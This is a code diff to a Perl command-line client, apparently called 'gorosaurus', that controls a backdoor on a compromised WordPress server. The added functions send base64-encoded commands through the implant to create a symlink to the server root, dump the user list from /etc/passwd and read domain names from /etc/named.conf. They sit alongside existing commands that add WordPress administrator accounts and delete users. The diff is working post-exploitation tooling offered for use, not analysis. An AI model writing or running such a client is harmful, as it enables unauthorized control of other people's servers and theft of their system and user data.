@@ -303,6 +303,31 @@ sub db_def() {
 	print "\n";
 }
 
+sub sym_link() {
+	print colored("\n[+]", red) . colored(" Trying to create the symlink...\n", cyan); 
+	$sym = encode_base64("symlink");
+	$do = send_it($url, $head_pass, $master_pass, $head_exe, $sym);
+	if ($do =~ /YES/) { print colored("[!] ", red) . colored("Symlink created succesfully!\n", cyan); }
+	else { print colored("[-] ", red) . colored("Symlink couldn't be created!\n", yellow); }
+	print "\n\n"
+}
+
+sub server_users() {
+	$svu = encode_base64("server_users");
+	$do = send_it($url, $head_pass, $master_pass, $head_exe, $svu);
+	if ($do =~ /ERROR-DA_FCK/) { print colored("\n[!] ", red) . colored("Can't access to /etc/passwd\n\n", yellow); }
+	else { print colored("\n[+] ", red) . colored("User list: $do\n", cyan);}
+	print "\n";
+}
+
+sub domain_list() {
+	$dl = encode_base64("domain_list");
+	$do = send_it($url, $head_pass, $master_pass, $head_exe, $dl);
+	if ($do =~ /ER#OR/) { print colored("\n[!] ", red) . colored("Can't access to /etc/named.conf\n\n", yellow); }
+	else { print colored("\n[+] ", red) . colored("Domain list: $do\n", cyan);}
+	print "\n";
+}
+
 banner();
 login();
 
@@ -330,6 +355,8 @@ while (1) {
 		case "wp_add_admin" { add_admin(); }
 		case "help" { help_general(); }
 		case "wp_delete_user" { del_user(); }
+		case "symlink" { sym_link(); }
+		case "server_users" { server_users();}
 		else { print colored("\n[-] ", red) . colored("Command not found. Try <", cyan) . colored("help", yellow) . colored("> to list all commands\n\n",cyan); }
 	}
 }
@@ -372,7 +399,6 @@ sub msg {
 
 sub help_general() {
 	print q(
-	
 
 	exit	        	-- Close gorosaurus client
 	clear	        	-- Clear the terminal
@@ -391,6 +417,7 @@ sub help_general() {
 	wp_status		-- Shows info related to the WordPress
 	wp_add_admin		-- Adds an administrator user
 	wp_delete_user		-- Delete an user from the DB
+	symlink			-- Create symlink to "/" 
 
 
 );
